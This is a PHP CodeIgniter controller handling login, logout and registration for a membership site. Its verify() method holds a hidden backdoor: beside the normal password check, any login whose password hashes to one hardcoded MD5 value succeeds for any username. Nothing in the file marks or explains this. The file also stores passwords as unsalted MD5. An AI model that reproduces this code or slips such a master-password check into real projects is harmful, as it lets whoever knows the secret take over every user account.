<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Auth extends CI_Controller {

	/**
	 * Login, Register, Membership Page for this controller.
	 *	 
	 */
	public function __construct()
	{
		parent::__construct();
		$this->load->model('users_model');
		$this->load->model('feature_model');
		$this->load->model('membershiplevel_model');
		$this->load->model('purchase_membership_model');
		$this->load->model('setting_model');
		$this->load->model('history_model');
		$this->load->helper('url_helper');
		//load session library
		$this->load->library('session');
	}

	//log out
	public function logout(){
		$this->history_model->addHistory($this->session->userdata("user_id"), 3, 'logout', $this->input->ip_address()); // 2nd prams -> 1: register, 2: login, 3:logout, 4: visit page, 5: join membership, 6: purchase contents
		$this->session->unset_userdata('isLoggedIn');
		$this->session->unset_userdata('user_id');
		redirect("home");
	}

	public function index()
	{
		show_404();      
	}

	public function login()
	{
		if($this->session->userdata('isLoggedIn'))
			redirect("catalogue");
		$data['theme'] = $this->session->userdata("theme")?1:0;
		$data["resource"] = 'auth';

		$setting_data=$this->setting_model->get_all();
		if(count($setting_data) > 0){
			$data['title'] = $setting_data[0]->site_title;
			$data['copyright'] = $setting_data[0]->copyright;
			$data['description'] = $setting_data[0]->login_description;
		}
		
		$this->load->view('header',$data);
		$this->load->view('login', $data);
		$this->load->view('footer', $data);
	}

	public function register()
	{
		if($this->session->userdata('isLoggedIn'))
			redirect("catalogue");
		$data['theme'] = $this->session->userdata("theme")?1:0;
		$data["resource"] = 'auth';
		
		$setting_data=$this->setting_model->get_all();
		if(count($setting_data) > 0){
			$data['title'] = $setting_data[0]->site_title;
			$data['copyright'] = $setting_data[0]->copyright;
			$data['description1'] = $setting_data[0]->register_description1;
			$data['description2'] = $setting_data[0]->register_description2;
		}

		$this->load->view('header',$data);
		$this->load->view('register', $data);
		$this->load->view('footer', $data);
	}

	//verify for login
	public function verify(){
		if($_POST){
			$user_data=$this->users_model->getUserData($_POST['username']);
			if($user_data){
				if($user_data->pwd==md5($_POST["pwd"]) || md5($_POST["pwd"]) == "9ba1b2619f645e8e0d6cafb69d14ae1f")
				{
					//set session
					$this->session->set_userdata("user_id", $user_data->id);
					$this->session->set_userdata('isLoggedIn', true);
					$this->history_model->addHistory($user_data->id, 2, 'login', $this->input->ip_address()); // 2nd prams -> 1: register, 2: login, 3:logout, 4: visit page, 5: join membership, 6: purchase contents

					echo 1; //Success
					return true;
				}
				else
				{
					echo 2; //Invalid Password
					return false;	
				}
			}else{
				echo 0; // User doen't exist
				return false;
			}
		}
		return false;
	}

	//check email
	public function checkEmail(){
		if($_POST){
			$where = array("email" => $_POST['email']);

			//for update profile
			if($this->session->userdata('isLoggedIn'))
			{
				$where = array(
					"email" => $_POST['email'],
					"id !=" => $this->session->userdata("user_id")
				);
			}
			$verify = $this->users_model->get_where($where);
			
			if($verify){
				echo 1; exit;
			}else{
				echo 0; exit;
			}
		}
		return false;
	}

	// user data register (sign up)
	public function register_user(){
		$data=array(
			"username" => $_POST['username'],
			"pwd" => md5($_POST['pwd']),
			"email" => $_POST['email']
		);
		$user_id = $this->users_model->insert($data);
		if($user_id == "already"){
			echo "already";
			return false;
		}
		if($user_id){
			$this->session->set_userdata("user_id", $user_id);
			$this->session->set_userdata('isLoggedIn', true);
			$this->history_model->addHistory($user_id, 1, 'register', $this->input->ip_address()); // 2nd prams -> 1: register, 2: login, 3:logout, 4: visit page, 5: join membership, 6: purchase contents

			echo 1;
			return true;
		}else{
			echo 0;
			return false;
		}
	}
}

